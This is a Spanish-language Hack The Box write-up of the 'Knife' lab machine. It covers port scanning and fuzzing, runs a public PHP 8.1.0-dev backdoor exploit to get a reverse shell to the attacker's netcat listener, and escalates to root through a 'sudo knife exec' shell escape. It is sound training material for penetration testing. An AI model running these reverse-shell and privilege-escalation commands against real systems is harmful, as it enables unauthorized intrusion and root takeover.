---
layout: single
title: Knife - Hack The Box
excerpt: "Esta es una máquina muy fácil, vamos a aprovecharnos de una vulnerabilidad en la versión de PHP 8.0.1-dev que nos permitirá conectarnos de manera remota como el usuario James, una vez dentro, vamos a investigar los privilegios que tenemos, encontrando que podemos usar el binario Knife, buscamos en la página GTFObins y nos explica una forma para convertirnos en Root."
date: 2023-05-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-knife/knife_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - PHP
  - Remote Code Execution - RCE
  - PHP 8.0.1-dev - RCE
  - Reverse Shell
  - SUDO Exploitation
  - Binary Knife
  - OSCP Style
---
![](/assets/images/htb-writeup-knife/knife_logo.png)

Esta es una máquina muy fácil, vamos a aprovecharnos de una vulnerabilidad en la versión de **PHP 8.0.1-dev** que nos permitirá conectarnos de manera remota como el usuario **James**, una vez dentro, vamos a investigar los privilegios que tenemos, encontrando que podemos usar el **binario Knife**, buscamos en la página **GTFObins** y nos explica una forma para convertirnos en **Root**.

<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Puerto 80</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Exploit">Buscando un Exploit para PHP</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>
Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```
ping -c 4 10.10.10.242
PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
64 bytes from 10.10.10.242: icmp_seq=1 ttl=63 time=188 ms
64 bytes from 10.10.10.242: icmp_seq=2 ttl=63 time=341 ms
64 bytes from 10.10.10.242: icmp_seq=3 ttl=63 time=140 ms
64 bytes from 10.10.10.242: icmp_seq=4 ttl=63 time=189 ms

--- 10.10.10.242 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 139.758/214.254/340.532/75.560 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 13:03 CST
Initiating SYN Stealth Scan at 13:03
Scanning 10.10.10.242 [65535 ports]
Discovered open port 22/tcp on 10.10.10.242
Discovered open port 80/tcp on 10.10.10.242
Completed SYN Stealth Scan at 13:03, 26.71s elapsed (65535 total ports)
Nmap scan report for 10.10.10.242
Host is up, received user-set (1.3s latency).
Scanned at 2023-05-10 13:03:13 CST for 26s
Not shown: 52975 filtered tcp ports (no-response), 12558 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.81 seconds
           Raw packets sent: 125074 (5.503MB) | Rcvd: 12589 (503.600KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Veo solamente dos puertos abiertos, todo apunta a que debemos analizar el puerto 80, veamos que nos dice el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>
```
nmap -sC -sV -p22,80 10.10.10.242 -oN targeted                           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 13:05 CST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 13:06 (0:00:06 remaining)
Nmap scan report for 10.10.10.242
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be549ca367c315c364717f6a534a4c21 (RSA)
|   256 bf8a3fd406e92e874ec97eab220ec0ee (ECDSA)
|_  256 1adea1cc37ce53bb1bfb2b0badb3f684 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

No veo información que nos sirva útil, analicemos la página web.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="HTTP">Analizando Puerto 80</h2>

Entremos.

<p align="center">
<img src="/assets/images/htb-writeup-knife/Captura1.png">
</p>

La página se ve simple, los campos que tiene no funcionan, veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-knife/Captura2.png">
</p>

Uffff, está programado en PHP, veamos que nos dice la herramienta **whatweb**:
```
whatweb http://10.10.10.242/                                                                                          
http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```
Me llama la atención esto: **X-Powered-By[PHP/8.1.0-dev]**, puede que nos sirva después.

Revise el código fuente, pero no encontré nada que nos pueda ayudar, así que no lo pondré aquí.

Antes de buscar un Exploit, vamos a hacer un **Fuzzing** para ver si encontramos una subpágina que nos sea útil.

<h2 id="Fuzz">Fuzzing</h2>
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.242/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.242/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000001:   200        220 L    526 W      5815 Ch     "# directory-list-2.3-medium.txt"                                     
000000003:   200        220 L    526 W      5815 Ch     "# Copyright 2007 James Fisher"                                       
000000007:   200        220 L    526 W      5815 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
000000014:   200        220 L    526 W      5815 Ch     "http://10.10.10.242//"                                               
000000013:   200        220 L    526 W      5815 Ch     "#"                                                                   
000000012:   200        220 L    526 W      5815 Ch     "# on atleast 2 different hosts"                                      
000000011:   200        220 L    526 W      5815 Ch     "# Priority ordered case sensative list, where entries were found"    
000000008:   200        220 L    526 W      5815 Ch     "# or send a letter to Creative Commons, 171 Second Street,"          
000000009:   200        220 L    526 W      5815 Ch     "# Suite 300, San Francisco, California, 94105, USA."                 
000000006:   200        220 L    526 W      5815 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"       
000000010:   200        220 L    526 W      5815 Ch     "#"                                                                   
000000005:   200        220 L    526 W      5815 Ch     "# This work is licensed under the Creative Commons"                  
000000004:   200        220 L    526 W      5815 Ch     "#"                                                                   
000000002:   200        220 L    526 W      5815 Ch     "#"                                                                   
000000083:   200        220 L    526 W      5815 Ch     "icons"                                                               
000045240:   200        220 L    526 W      5815 Ch     "http://10.10.10.242//"                                               
000095524:   403        9 L      28 W       277 Ch      "server-status"                                                       

Total time: 531.9833
Processed Requests: 220560
Filtered Requests: 220543
Requests/sec.: 414.5994
```
* -c: Para que se muestren los resultados con colores.
* –hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster.

Encontró una subpágina llamada **icons**, pero no sirve, veamos si nos reporta algo en **PHP**:
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.242/FUZZ.php/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.242/FUZZ.php/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000001:   200        220 L    526 W      5815 Ch     "# directory-list-2.3-medium.txt"                                     
000000003:   200        220 L    526 W      5815 Ch     "# Copyright 2007 James Fisher"                                       
000000007:   200        220 L    526 W      5815 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
000000015:   200        220 L    526 W      5815 Ch     "index"                                                               
000000011:   200        220 L    526 W      5815 Ch     "# Priority ordered case sensative list, where entries were found"    
000000008:   200        220 L    526 W      5815 Ch     "# or send a letter to Creative Commons, 171 Second Street,"          
000000009:   200        220 L    526 W      5815 Ch     "# Suite 300, San Francisco, California, 94105, USA."                 
000000012:   200        220 L    526 W      5815 Ch     "# on atleast 2 different hosts"                                      
000000013:   200        220 L    526 W      5815 Ch     "#"                                                                   
000000005:   200        220 L    526 W      5815 Ch     "# This work is licensed under the Creative Commons"                  
000000010:   200        220 L    526 W      5815 Ch     "#"                                                                   
000000004:   200        220 L    526 W      5815 Ch     "#"                                                                   
000000006:   200        220 L    526 W      5815 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"       
000000002:   200        220 L    526 W      5815 Ch     "#"                                                                   

Total time: 0
Processed Requests: 217329
Filtered Requests: 217315
Requests/sec.: 0

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 55: Connection died, tried 5 times before giving up
```
* -c: Para que se muestren los resultados con colores.
* –hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster.

Nada, quiero pensar que la movida será por PHP, vamos a buscar un Exploit.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Exploit">Buscando un Exploit para PHP</h2>

Encontré un Exploit para la versión que está usando la página web:
* https://www.exploit-db.com/exploits/49933

Para que no pierdas el tiempo como yo, esta versión del Exploit no nos servirá, el mismo autor creó una **Reverse Shell**, usando el mismo Exploit. Esta versión la encontramos en su **GitHub**:
* https://github.com/flast101/php-8.1.0-dev-backdoor-rce

Vamos a descargar solamente la versión **Reverse Shell**:
```
wget https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/main/revshell_php_8.1.0-dev.py             
--2023-05-10 14:24:23--  https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/main/revshell_php_8.1.0-dev.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.110.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2318 (2.3K) [text/plain]
Grabando a: «revshell_php_8.1.0-dev.py»

revshell_php_8.1.0-dev.py         100%[============================================================>]   2.26K  --.-KB/s    en 0s      

2023-05-10 14:24:23 (60.6 MB/s) - «revshell_php_8.1.0-dev.py» guardado [2318/2318]
```
Si usamos el parámetro **-h**, nos explicará como usarlo:
```
python3 revshell_php_8.1.0-dev.py -h
usage: revshell_php_8.1.0-dev.py [-h] <target URL> <attacker IP> <attacker PORT>

Get a reverse shell from PHP 8.1.0-dev backdoor. Set up a netcat listener in another shell: nc -nlvp <attacker PORT>

positional arguments:
  <target URL>     Target URL
  <attacker IP>    Attacker listening IP
  <attacker PORT>  Attacker listening port

options:
  -h, --help       show this help message and exit
```
Necesitamos una netcat, activemos una:
```
nc -nvlp 443                   
listening on [any] 443 ...
```
Ahora, usa el Exploit:
```
python3 revshell_php_8.1.0-dev.py http://10.10.10.242 10.10.14.5 443
   
```
Y ve la netcat:
```
nc -nvlp 443                   
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.242] 42246
bash: cannot set terminal process group (899): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ whoami
whoami
james
```
Te recomiendo sacar una shell interactiva, después de que lo hagas, busca la flag:
```
james@knife:~$ cd /home
james@knife:/home$ ls
james
james@knife:/home$ cd james
james@knife:~$ ls
user.txt
james@knife:~$ cat user.txt
...
```
¡Listo! Tenemos la flag del usuario, ahora, veamos como escalar privilegios.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


Veamos qué privilegios tenemos:
```
james@knife:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
Resulta que esto es un binario, veamos que nos dice nuestra biblia **GTFObins** sobre este binario:
* https://gtfobins.github.io/gtfobins/knife/

Nos explica una forma de como escalar privilegios, vamos a probarlo:
```
james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'
# whoami
root
```
a...bueno, busquemos la flag:
```
# cd /root
# ls
delete.sh  root.txt  snap
# cat root.txt
...
```
Muy bien, ya completamos la máquina.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://www.exploit-db.com/exploits/49933
* https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
* https://github.com/flast101/php-8.1.0-dev-backdoor-rce
* https://gtfobins.github.io/gtfobins/knife/


<br>
# FIN
